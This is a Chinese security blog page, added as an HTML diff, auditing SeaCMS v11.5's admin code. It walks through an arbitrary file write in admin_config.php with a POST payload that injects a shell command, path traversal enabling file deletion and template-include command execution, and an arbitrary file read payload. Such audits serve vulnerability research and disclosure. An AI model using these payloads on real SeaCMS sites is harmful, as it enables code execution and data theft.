@@ -1,0 +1,238 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>seacmsv11.5代码审计 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="seacmsv11.5后台任意文件写入admin/admin_config.php
+在140行有文件写入的地方，查看这两个参数是否可控：
+$configfile参数为PHP文件：
+
+$configs,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">seacmsv11.5代码审计</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">seacmsv11.5代码审计</h1>
+        <div class="stuff">
+            <span>三月 25, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP/" rel="tag">代码审计-PHP</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="seacmsv11-5后台任意文件写入"><a href="#seacmsv11-5后台任意文件写入" class="headerlink" title="seacmsv11.5后台任意文件写入"></a>seacmsv11.5后台任意文件写入</h3><h4 id="admin-admin-config-php"><a href="#admin-admin-config-php" class="headerlink" title="admin/admin_config.php"></a>admin/admin_config.php</h4><p><img src="clipboard-1648202197443.png" alt="img"></p>
+<p>在140行有文件写入的地方，查看这两个参数是否可控：</p>
+<p>$configfile参数为PHP文件：</p>
+<p><img src="clipboard-1648202203534.png" alt="img"></p>
+<p>$configstr参数由post参数得来，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">   <span class="variable">$v</span> = cn_substr(str_replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&#x27;&quot;</span>,str_replace(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;\\\\&quot;</span>,stripslashes($&#123;<span class="variable">$k</span>&#125;))),<span class="number">500</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//将$v中存在的单引号过滤掉，会在单引号前面加上反斜杠，会将注释//过滤掉，添加//。</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="clipboard-1648202219685.png" alt="img"></p>
+<p>参数可控，可写入，导致代码执行。</p>
+<p>因此当我们构造传入post数据，变量名是以edit__开头，在值中传入我们构造的恶意代码，即可触发代码执行。</p>
+<p><img src="clipboard-1648202288853.png" alt="img"></p>
+<p>再往上看：</p>
+<p><img src="clipboard-1648202297764.png" alt="img"></p>
+<p>需要满足这个if语句中的条件，代码才能往下执行。</p>
+<p>因此构造传入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit___cfg_df_style=1&amp;edit___cfg_df_html=1&amp;edit___cfg_ads_dir=1&amp;edit___cfg_upload_dir=1&amp;edit___cfg_backup_dir=1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>任意构造发现是可以写入的：</p>
+<p><img src="clipboard-1648202319140.png" alt="img"></p>
+<p>构造闭合：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /uam7rw/admin_config.php/?dopost=save</span><br><span class="line"></span><br><span class="line">edit___cfg_df_style=1&amp;edit___cfg_df_html=1&amp;edit___cfg_ads_dir=1&amp;edit___cfg_upload_dir=1&amp;edit___cfg_backup_dir=1&amp;edit___s;`calc`?&gt;=a</span><br></pre></td></tr></table></figure>
+
+<p><img src="clipboard-1648202337054.png" alt="img"></p>
+<p>访问data/config.cache.inc.php，触发代码：</p>
+<p><img src="clipboard-1648202343764.png" alt="img"></p>
+<h4 id="uam7rw-admin-files-php—任意文件删除"><a href="#uam7rw-admin-files-php—任意文件删除" class="headerlink" title="uam7rw/admin_files.php—任意文件删除"></a>uam7rw/admin_files.php—任意文件删除</h4><p><img src="clipboard-1648202362832.png" alt="img"></p>
+<p>当$action为del时，发现一个unlink函数，追溯$filedir看看参数是否可控：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr(strtolower(<span class="variable">$filedir</span>),<span class="number">0</span>,<span class="variable">$dirlen</span>)!=<span class="variable">$dirTemplate</span>)</span><br></pre></td></tr></table></figure>
+
+<p>$dirTemplate：</p>
+<p><img src="clipboard-1648202387300.png" alt="img"></p>
+<p>但是这里可以尝试使用../进行路径穿越，因此可以造成任意文件的读取和删除：</p>
+<p>路径穿越：</p>
+<p><img src="clipboard-1648202396560.png" alt="img"></p>
+<p>利用路径穿越造成文件的删除：</p>
+<p><img src="clipboard-1648202406157.png" alt="img"></p>
+<h4 id="uam7rw-admin-files-php"><a href="#uam7rw-admin-files-php" class="headerlink" title="uam7rw/admin_files.php"></a>uam7rw/admin_files.php</h4><p><img src="clipboard-1648202429059.png" alt="img"></p>
+<p>include文件包含，通过前面的路径穿越可以修改文件，修改admin下的/templets/admin_files.htm文件：</p>
+<p><img src="clipboard-1648202439196.png" alt="img"></p>
+<p>达到命令执行：</p>
+<p><img src="clipboard-1648202447457.png" alt="img"></p>
+<p>在admin_notify.php等文件中存在多处文件写入的地方，都是参数未进行过滤，构造闭合写入即可。</p>
+<p>admin/admin_safe.php—任意文件读取</p>
+<p><img src="clipboard-1648202496393.png" alt="img"></p>
+<p>$file参数不存在过滤，可以使用前面的路径穿越进行任意文件的读取，通过file_get_contents函数进行读取：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line"></span><br><span class="line">admin_safe.php?action=download&amp;file=../diy.php</span><br></pre></td></tr></table></figure>
+
+<p>200状态码执行成功。</p>
+<p><img src="clipboard-1648202516247.png" alt="img"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#seacmsv11-5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">seacmsv11.5后台任意文件写入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#admin-admin-config-php"><span class="toc-number">1.1.</span> <span class="toc-text">admin&#x2F;admin_config.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uam7rw-admin-files-php%E2%80%94%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-number">1.2.</span> <span class="toc-text">uam7rw&#x2F;admin_files.php—任意文件删除</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uam7rw-admin-files-php"><span class="toc-number">1.3.</span> <span class="toc-text">uam7rw&#x2F;admin_files.php</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
